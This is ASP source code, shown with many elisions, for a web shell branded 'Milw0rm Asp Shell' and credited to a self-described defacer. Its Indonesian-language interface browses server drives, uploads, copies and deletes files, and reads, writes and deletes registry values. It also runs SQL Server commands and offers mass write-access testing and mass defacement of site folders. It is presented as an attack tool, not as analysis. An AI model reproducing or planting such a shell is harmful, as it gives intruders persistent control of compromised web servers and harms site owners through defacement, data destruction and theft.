...
Class UploadedFile
	...
	End Sub
End Class
startcode = "<html><head><title>Milw0rm</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1""><a href=""https://github.com/beruangsalju"" target=""_blank"">GITHUB</a></font><br>"
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         ...
         END IF
End Function
cprthtml = "<font color=red>w0rm asp shell <font color=purple>by <font color=green>dihanhaxor1337</font>"
Dim Base64Chars
...
keydec="<center> <font color=green><b>Milw0rm Asp Shell By Dihanhaxor1337 </font></center></p>"
...
Sub showcontent()
	showdisks=TRUE
	Response.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root"">DRIVES</a> <br>LOKASI SCRIPT: " & UCase(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) & "<br><br></font>"
		...
		For Each drive IN drivecollection 
			...
			Select Case drive.DriveType
				...
				Case 5
					...
					End If
			End Select
			response.write "<b>Tipe:</b> " & tipodrive & "<br>"
			response.write "<b>Nama: </b>" & nomedrive & "<br>"
			response.write "<b>File Sistem: </b>"
			If drive.isready Then
	...
	Else
		...
		Response.Write "<font face='arial' size='1' color='lime'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=test&path=" & Replace(raiz,"\","|") & "', 'win1','width=600,height=300,scrollbars=YES,resizable')"">TEST MASSAL " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1' color='teal'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc&path=" & Replace(raiz,"\","|") & "', 'win1','width=700,height=300,scrollbars=YES,resizable')"">DEFACE MASSAL " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1' color='magenta'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&path=" & Replace(raiz,"\","|") & "', 'win1','width=500,height=100,scrollbars=YES,resizable')"">UNGGAH FILE " & UCase(raiz) & "</a></font><br><br>"
		...
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=info', 'win1','width=760,height=450,scrollbars=YES,resizable')"">INFORMASI SISTEM</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg', 'win1','width=550,height=200,scrollbars=YES,resizable')"">DAFTAR EDITOR</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=search&path=" & Replace(raiz,"\","|") & "', 'win1','width=500,height=100,scrollbars=YES,resizable')"">PENCARIAN</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=sqlserver', 'win1','width=550,height=150,scrollbars=YES,resizable')"">EKSEKUSI SQL</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=about', 'win1','width=550,height=250,scrollbars=YES,resizable')"">TENTANG</a>"
		Response.Write "</font><br><br>"


		Response.Write "<font face='arial'><b>Akar Folder :  " & raiz & "</b></font><br><br>"
		...
		for each folderItem in ColFolders
			Response.Write "<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & folderItem.path & "'>" & showobj(folderItem.path) & "</a></b></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=250,scrollbars=YES,resizable')"">&lt;&lt; Letakkan</a></font></td>"
			Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=fcopy&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=100,scrollbars=YES,resizable')"">&lt;&lt; Salin/Pindah</a></font></td>"
			Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=fdel&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=150,scrollbars=YES,resizable')"">&lt;&lt; Hapus</a></font></td></tr>"
		next
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "reg"
		...
		Select Case Trim(Request.QueryString("regaction"))
			...
			Case "d"
				...
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">Main Menu</a><br>"
			Case Else
				Response.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=w"">TULIS NILAI</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=r"">BACA NILAI</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=d"">HAPUS KATA KUNCI</a><br>"
		End Select
		Set WshShell = Nothing
	Case "txtview"
		checa = checking(cprthtml,keydec)
	...
	Case "upload"
		If Request.QueryString("processupload") <> "yes" Then
			...
			Response.Write "<tr><td><font face=""arial"" size=""2""><b>pilih file:</b><br><INPUT TYPE=FILE SIZE=50 NAME=""FILE1""></td></tr>"
			Response.Write "<tr><td align=""center""><font face=""arial"" size=""2""><INPUT TYPE=SUBMIT VALUE=""Crootz""></td></tr>"
			Response.Write "</TABLE>"
		Else
			...
			Else
				For Each File In Uploader.Files.Items
					...
					Response.Write "File Sukses Upload: " & File.FileName & "<br>"
					Response.Write "Ukuran: " & File.FileSize & " bytes<br>"
					Response.Write "Tipe: " & File.ContentType & "<br><br>"
					Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
				Next
			End If
		End If
		...
		Sub brutemass(caminho,massaction)
			If massaction = "test" Then
				...
				for each folderItem in ColFolders
					...
					If Err.Number = 0 Then
						Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>AKSES DI IJINKAN</font></td></tr>"
					Else
	...
	Case "search"
	 ...
	 Else
		...
		Response.Write "<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>Extensi File : </td><td>"
	...
	Case "sqlserver"
	 ...
	 Else
		...
		Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server terhubung ke string : </td></tr><tr><td align=center>"
		Response.Write "<input type=hidden value='7' name=status>"
		Response.Write "<input style='width:250; height:21' value='' name=path><br>"
		response.Write "<input type=submit value='Eksekusi Perintah SQL Server' style='height:23;width:220' id=submit1 name=submit1>"
	...
	Case "about"
		...
		checa = checking(cprthtml,keydec)
		Call hdr()
		response.Write "<br><br><br><body topmargin=5 leftmargin=0><center><h4>Modified By Omest"
		response.Write "<br><br>"
		response.Write "<font size=2 color=green face='iceland'>Milw0rm Asp Shell</font>"
		response.Write "<br>"
		response.Write "<font size=2 color=red face='iceland'>E-Mail: dhpriv8@gmail.com</font>"
		response.Write "<br><br>"
		response.Write "<font size=2 color=Blue face='iceland'>Programmer - Defacer - Ctf Player : since 2016</font>"
...
End Select
If Err.Number <> 0 Then
	Response.Write "<br><font face='arial' size='2'>ERROR: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Akses Di Tolak"
End If
